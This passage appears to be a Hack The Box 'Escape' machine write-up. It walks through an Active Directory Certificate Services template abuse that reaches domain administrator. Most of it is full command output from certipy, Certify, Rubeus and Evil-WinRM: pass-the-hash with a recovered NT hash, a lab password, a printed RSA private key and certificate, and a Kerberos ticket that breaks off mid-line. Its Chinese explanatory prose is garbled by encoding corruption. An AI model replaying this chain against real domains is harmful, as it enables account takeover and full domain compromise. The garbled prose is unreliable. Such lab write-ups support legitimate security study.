<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># ntpdate -u dc.sequel.htb</span></span><br><span class="line">2023-06-19 09:28:43.681199 (-0400) +1.777965 +/- 0.337931 dc.sequel.htb 10.10.11.202 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 1.777965</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-DC-CA -template UserAuthentication</span></span><br><span class="line">Certipy v4.4.0 - by Oliver Lyak (ly4k)op</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 13</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;administrator@sequel.htb&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>æ³¨æ„: å¦‚æœå‡ºç°â€The NETBIOS connection with the remote host timed out.â€é”™è¯¯ã€‚è¯·é‡æ–°æ‰§è¡Œå‘½ä»¤</p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape5.png"></p>
</li>
</ul>
<p>ç°åœ¨æœ‰äº†administratorçš„è¯ä¹¦ï¼Œå¯ä»¥å†æ¬¡ä½¿ç”¨certipyæ¥è·å¾—Ticket Granting Ticket (TGT)ï¼Œå¹¶æå–è¯¥ç”¨æˆ·çš„NT hashã€‚ç”±äºè¿™ä¸€æ­¥éœ€è¦ä¸€äº›Kerberosäº¤äº’ï¼Œå› æ­¤éœ€è¦å°†æ—¶é’ŸåŒæ­¥åˆ°è¿œç¨‹æœºå™¨çš„æ—¶é—´ï¼Œç„¶åæ‰èƒ½ç»§ç»­ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># certipy auth -pfx administrator.pfx</span></span><br><span class="line">Certipy v4.4.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@sequel.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@sequel.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape6.png"></li>
</ul>
<p>æœ€åï¼Œå¯ä»¥é€šè¿‡WinRM PTHå¹¶ä½œä¸ºç®¡ç†å‘˜ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># ls</span></span><br><span class="line"> administrator.ccache   administrator.pfx   Certify.exe  <span class="string">&#x27;SQL Server Procedures.pdf&#x27;</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">sequel\administrator</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ../Desktop/root.txt</span><br><span class="line">427e2e823cf867a7a25b8f6d9943be9b</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape7.png"></li>
</ul>
<h3 id="æ–¹æ³•2-Certify-Rubeus"><a href="#æ–¹æ³•2-Certify-Rubeus" class="headerlink" title="æ–¹æ³•2: Certify + Rubeus"></a>æ–¹æ³•2: Certify + Rubeus</h3><p>å¯ä»¥ç»§ç»­ä½¿ç”¨READMEåœºæ™¯3ï¼Œæ¥ä¸‹æ¥è¿è¡ŒCertify.exeä»¥è¯·æ±‚å…·æœ‰ç®¡ç†å‘˜æ›¿ä»£åç§°çš„è¯ä¹¦ã€‚å®ƒè¿”å›ä¸€ä¸ªcert.pem:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ <span class="string">&#x27;__| __| |  _| | | |</span></span><br><span class="line"><span class="string"> | |___|  __/ |  | |_| | | | |_| |</span></span><br><span class="line"><span class="string">  \_____\___|_|   \__|_|_|  \__, |</span></span><br><span class="line"><span class="string">                             __/ |</span></span><br><span class="line"><span class="string">                            |___./</span></span><br><span class="line"><span class="string">  v1.1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Action: Request a Certificates</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Current user context    : sequel\Ryan.Cooper</span></span><br><span class="line"><span class="string">[*] No subject name specified, using current context as subject.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Template                : UserAuthentication</span></span><br><span class="line"><span class="string">[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb</span></span><br><span class="line"><span class="string">[*] AltName                 : administrator</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] CA Response             : The certificate had been issued.</span></span><br><span class="line"><span class="string">[*] Request ID              : 14</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] cert.pem         :</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIIEowIBAAKCAQEAtBgKNxFL7Q800mUoE7O8f2n5A28GL72XmJlDeeSxuKac7SoO</span></span><br><span class="line"><span class="string">ovM9OwUSFfZeLYp/NJgCvDNq7eouR9A/yT22e5KJP6O9v3DmYwWzR2LgzxPsF9A/</span></span><br><span class="line"><span class="string">XIHWP8jWj+HIoFecwuPWnyoDbHd57vLv8qwpbjavPXrESTuCbQguCwGXPT8mSTsN</span></span><br><span class="line"><span class="string">SWrWOCizxlOVTL1n2ro9Wdux9BThrhHg9v/G5SWqv2MQGlvr/5fuS/jzvNs6BLIA</span></span><br><span class="line"><span class="string">FajSi7XchQSBuptp5wQsHkNIkQfA6H64AAxLFtBjUMTEI5bdMLNMZcTQ9DedaaWo</span></span><br><span class="line"><span class="string">yT9TDEdwoUFi9PC5J7WVn+2+IVDr6CRdhF8aAQIDAQABAoIBAQCf6PipDOKuC+KL</span></span><br><span class="line"><span class="string">Lub3F5E4UZCaS+riWSZSiUQw57AmlUqiC8YTSogD7+yvM6NMLL3mpVNIaR95QYb2</span></span><br><span class="line"><span class="string">nSMGPZXbA7J6n5nMcyMeqeEWceXL+ZSZUH/yVBc5a8uY1pKeTS0Un9niWhvQJAZQ</span></span><br><span class="line"><span class="string">9cW5ZMUk58mSfX/sxrp4tdqsSy1PY1X6qd7fojql0GvIHQAKWaDsziyfaevWV6I6</span></span><br><span class="line"><span class="string">evBwwVLhu7ZsZPwCFN9SoDs281FNYWGSA2fBVoTPtT/sz3gLouugZ3+k+Epx/HLM</span></span><br><span class="line"><span class="string">vAdDSWCSsDYkzPlAOtw8wroHqUA8pEKfzk32iOqO5odOREdhWdtjpPKIkjl1Pgld</span></span><br><span class="line"><span class="string">Sv4NA81BAoGBANYJAHp4NyRGCmS+NfoXNDChmCEoVd1clroC3om9w/HFqgRB/xQW</span></span><br><span class="line"><span class="string">6VjzwsStjn82j/tzDWd/BA/JTUMP+syy8H4HemBqQd+Aru0/fX92QFNLsCUBba3Y</span></span><br><span class="line"><span class="string">nTktRgwA+iYiSFnUtS6OIWj/1osXsLs0LBesiC07kjefPpljBfv+GHC/AoGBANdn</span></span><br><span class="line"><span class="string">b3aMx77cmfkNARA7Q+eWHoyc+dmolOxAk18yQfCzlbpxufYR34dCLIXvlEyunUAs</span></span><br><span class="line"><span class="string">Q0b8/rBuZE6yRyJdEe/e5BpXey8E6fH09U7Ipm8wMv+AhweYGhrdWgF959fpoq93</span></span><br><span class="line"><span class="string">3XuMCEzoreU8Fm/7LzZKrcSKWI9qG1aNecPAIGU/AoGAXqNoVL6nEyDtI5J/Z2+v</span></span><br><span class="line"><span class="string">IfmxvKeLH+/6rZDrOVhxNYxDGtLbqNRgpXZTHofnRBSqIXLD8IlXEGvf/9EnAi/0</span></span><br><span class="line"><span class="string">6qT/1XXmXp8Vuc2i/iMZWjtTTWmOR5pKGqgMGu6rrQTnnODSpB0wZK8K/EGjYYM2</span></span><br><span class="line"><span class="string">I9mj9OwsQO/mzAfe84ds4x0CgYBUfvKuYlMIf6i2lW9RWq4sbirVpc4sn4CrnDkz</span></span><br><span class="line"><span class="string">IpfTP98AIBR+fkxc1ox4jZ5y5hwxTCun8R5HP0aByFU3GaMroReBbceYjijnDNwd</span></span><br><span class="line"><span class="string">Z4BCJXob1+MgC35SA3qHE0ia3b8/bZmoGSo4YR21ynhSvQmsFmdLralHuKu4rA6T</span></span><br><span class="line"><span class="string">xw3uKQKBgGuPZ6mecgQxTCFA2qOKsDuHHvwAcBCD6OpvCbc503HHiz483JOGD/kR</span></span><br><span class="line"><span class="string">HmmUWE+qtk2/6MwJoalIGpcG0AqDPnRvQzIpUsYcbWjfXau88IztpUc9GAcdZlxD</span></span><br><span class="line"><span class="string">vj3SOtueUwokYTFHdj0QrI34MIk9oauGdPPEAdVsNcq4GGFNcXeh</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE-----</span></span><br><span class="line"><span class="string">MIIGEjCCBPqgAwIBAgITHgAAAA5SZbT/DsiCAwAAAAAADjANBgkqhkiG9w0BAQsF</span></span><br><span class="line"><span class="string">ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs</span></span><br><span class="line"><span class="string">MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNjE5MTM0MDUzWhcNMjUwNjE5</span></span><br><span class="line"><span class="string">MTM1MDUzWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG</span></span><br><span class="line"><span class="string">c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi</span></span><br><span class="line"><span class="string">MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC0GAo3EUvtDzTSZSgTs7x/afkD</span></span><br><span class="line"><span class="string">bwYvvZeYmUN55LG4ppztKg6i8z07BRIV9l4tin80mAK8M2rt6i5H0D/JPbZ7kok/</span></span><br><span class="line"><span class="string">o72/cOZjBbNHYuDPE+wX0D9cgdY/yNaP4cigV5zC49afKgNsd3nu8u/yrCluNq89</span></span><br><span class="line"><span class="string">esRJO4JtCC4LAZc9PyZJOw1JatY4KLPGU5VMvWfauj1Z27H0FOGuEeD2/8blJaq/</span></span><br><span class="line"><span class="string">YxAaW+v/l+5L+PO82zoEsgAVqNKLtdyFBIG6m2nnBCweQ0iRB8DofrgADEsW0GNQ</span></span><br><span class="line"><span class="string">xMQjlt0ws0xlxND0N51ppajJP1MMR3ChQWL08LkntZWf7b4hUOvoJF2EXxoBAgMB</span></span><br><span class="line"><span class="string">AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9</span></span><br><span class="line"><span class="string">lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI</span></span><br><span class="line"><span class="string">KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV</span></span><br><span class="line"><span class="string">CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq</span></span><br><span class="line"><span class="string">hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF</span></span><br><span class="line"><span class="string">Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIiQhwSuIlv/oasHyBsBGTf3BqYO</span></span><br><span class="line"><span class="string">MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud</span></span><br><span class="line"><span class="string">IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg</span></span><br><span class="line"><span class="string">gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi</span></span><br><span class="line"><span class="string">bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv</span></span><br><span class="line"><span class="string">bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz</span></span><br><span class="line"><span class="string">ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE</span></span><br><span class="line"><span class="string">gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049</span></span><br><span class="line"><span class="string">QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv</span></span><br><span class="line"><span class="string">bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/</span></span><br><span class="line"><span class="string">b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF</span></span><br><span class="line"><span class="string">AAOCAQEACoeksTIvAowxHwtFJL0lrLwnrpkKCs8AWwsSKPSmXQ2uEHPkr/IRFNCq</span></span><br><span class="line"><span class="string">SMbwjEM411Dkhl/DHi92ru0fjLyZNTQCa6EGB9EgHfUkcclQpp28/F9idCO750FR</span></span><br><span class="line"><span class="string">dWqVnth+wEnhdyndqFNUJcFZk3U8T9YQpGqBFfLH3NhuXdKRJOktWXQgvT0lSoXZ</span></span><br><span class="line"><span class="string">Pwkxol0qB9RDdp3CI53RFdRE2wfbfdrtNJp3Rpja7IuaqWG/KFEpOhbdMJIc9VQN</span></span><br><span class="line"><span class="string">z2A0fkTicxgKpAmL+Pdw3TfV6LTCW4KctCPOKi7mTvGpB+VF70AaCtEFbYrtsHSB</span></span><br><span class="line"><span class="string">1cIrahApSyz9AAknrpE32s8r8tshIw==</span></span><br><span class="line"><span class="string">-----END CERTIFICATE-----</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Certify completed in 00:00:14.7055362</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape8.png"></li>
</ul>
<p>READMEå’Œè¾“å‡ºçš„æœ«å°¾éƒ½æ˜¾ç¤ºäº†ä¸‹ä¸€æ­¥ã€‚æŠŠä»â€”â€“BEGIN RSA PRIVATE KEYâ€”â€“åˆ°â€”â€“END CERTIFICATEâ€”â€“çš„æ‰€æœ‰å†…å®¹å¤åˆ¶åˆ°kaliçš„ä¸»æœºä¸Šçš„ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå¹¶ä½¿ç”¨ç»™å®šçš„å‘½ä»¤å°†å…¶è½¬æ¢ä¸º.pfxï¼Œåœ¨æç¤ºæ—¶ä¸è¾“å…¥å¯†ç :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span></span><br><span class="line">Enter Export Password:</span><br><span class="line">Verifying - Enter Export Password:</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># ls -la cert.pfx</span></span><br><span class="line">-rw------- 1 root root 3425 Jun 19 09:52 cert.pfx</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ cert.pfxå’ŒRubeus.exeï¼Œä»¥åŠ<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9SdWJldXM=">Rubeus<i class="fa fa-external-link-alt"></i></span>(ä»<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL1NoYXJwQ29sbGVjdGlvbg==">SharpCollection<i class="fa fa-external-link-alt"></i></span>ä¸‹è½½)ï¼Œç„¶åè¿è¡Œasktgtå‘½ä»¤ï¼Œå°†è¯ä¹¦ä¼ é€’ç»™å®ƒä»¥administratorèº«ä»½è·å¾—TGT:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; upload cert.pfx</span><br><span class="line"></span><br><span class="line">Info: Uploading /root/hackthebox/machine/escape/cert.pfx to C:\programdata\cert.pfx</span><br><span class="line"></span><br><span class="line">Data: 4564 bytes of 4564 bytes copied</span><br><span class="line"></span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; upload Rubeus.exe</span><br><span class="line"></span><br><span class="line">Info: Uploading /root/hackthebox/machine/escape/Rubeus.exe to C:\programdata\Rubeus.exe</span><br><span class="line"></span><br><span class="line">Data: 563200 bytes of 563200 bytes copied</span><br><span class="line"></span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.0.1</span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb</span><br><span class="line">[*] Building AS-REQ (w/ PKINIT preauth) <span class="keyword">for</span>: <span class="string">&#x27;sequel.htb\administrator&#x27;</span></span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] <span class="built_in">base64</span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC</span><br><span class="line">      AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBICUolA5MUDv</span><br><span class="line">      p3nENPQqNCTrVl6GRhkES3xwf9vx2y5sRAHHYSJFIdY+GiVFJWsSA56kL59TfnU+VzSI4JL/VIp5y8GZ</span><br><span class="line">      3O9e+JQaebsfL1NTkdx1AWTKDrAtlGjr9VeYeN7FbiGqC7GSYG5Dvy18ivWa/wa05X2j5ReGpdIVDs2K</span><br><span class="line">      WQZVufV/o7UeFgI4gjyR4b+tMI8EXebRKs5rPyBnrdH8on1y4i9f4jYnztDPE6Z7gzqBmD/xkgs6QyQL</span><br><span class="line">      lJPIq97japJltoHtlKpjBdgapeaQwoPlZC2qXrr5czdPfVY05O0p+vTkE7BnJz9PbrBxvAm2E0bBYNdo</span><br><span class="line">      +tBHtrF46R7q9Rh/zEYaqwPbRH+ZIrGLjEw0C3ETYGYT3fkkKvs3x93l8ZWJWMramFGR3K+rRcjJUMH9</span><br><span class="line">      14WlfYc1FWKYTf9zni6HQ1Qlyqpy5HrwdHbP7ZMJn9/RYTzRc8dTuwsC8LPiYzAQG0nii8J+jaUoyfAV</span><br><span class="line">      t8VUYLQwMprSwbuQVF7WIB2nCiSl9LWTFdMDuVBSqpRcRMV9J4cnogs4jMoKHZ2+NtaW6uLsEa+B6P64</span><br><span class="line">      iDHXs3W/7Gcr76vZRXuP4zt+jQrJGgM5hc9YDwraHOPVKI8a88zFvHNkPUCTfeMLi6gwU6yP3rB8usoX</span><br><span class="line">      4MlMBHABsyRlJihvHZuoOsa5+TqIb5GjtZXR/UXMPZTyJxPFU3BGJ6Zbxa6YR+5qvlTjmAl69V+AXeLV</span><br><span class="line">      1xf6mcLO0itv9vOwcKGSTvUwNGcKNiQZI77eYE3amW1hYL9WqB0QdsUV6wu/rM1b3XLB/1F0777CfVmN</span><br><span class="line">      vmaItYqEFdCU13615f3kxfqlCF8+/9KHcNs7q831CaDtJ3bttfrLKm9Q4ETyl8nAn0289kTHJsZYzAHO</span><br><span class="line">      TFn1FTecMjIFKT4KNH2MywkA2hSydHofBM2ZnRRCIwUhLsSk2WnJKGPqySb/zQFxaGKNsIivJb/3nqgb</span><br><span class="line">      oPij3KRc1hu00qDtxfURsTw6FoKyotmuGyShybJLPHiA9lRPngQaEYZwvDWeDdqiE+XV2X3E/GyecnCE</span><br><span class="line">      zOjRgCGUvGROBt2RVceSiMBdXyoR1pVo8Ud2gxKMNd8FoO8O+KWLswn8wI9KmDxWpA0aftcjag4qlRb8</span><br><span class="line">      zT9GV2N+koorTs2KdntoKTPf8c8UoaZ53yLzZoq7MtuhdzK0dAOAZ1PD8cgrDdjemM4LbPe1ItVMi/8K</span><br><span class="line">      a9KHkgFZsT4YqRS0IW9ogxpGzrlkSSFj9gebShWS28hq6OUrnKGlwDdXlUZnT1ek6SDPUFmcuoQG/HxT</span><br><span class="line">      j131je73bxI1tCc+djcKsfeV66pGpUQDfEnmrjF7648qs2W856ogY7jrdPnRHvhRT2LKNU1ceCQ3kWXo</span><br><span class="line">      xg6YMwRHGorgaCrSuxiN9dZZGBemu5LdATvuOhGs8CdH4TfSS9APvHusdlBLDzhxWNJbNNwuHSKdf1YB</span><br><span class="line">      uDgphdhx4q89PEsdUiu0Nop7awXQlYypvcToLOAeapH1i+bhe1zz3E/M6Es8RZOWmhyHqxWQrb5MCIiQ</span><br><span class="line">      42xYj9swMMhpX1EGfhLijmsAqxk88OlfUTXIdjo2L4XMdVePpnALWyiefe3uHLo81ZAy4tT6VF3nbufY</span><br><span class="line">      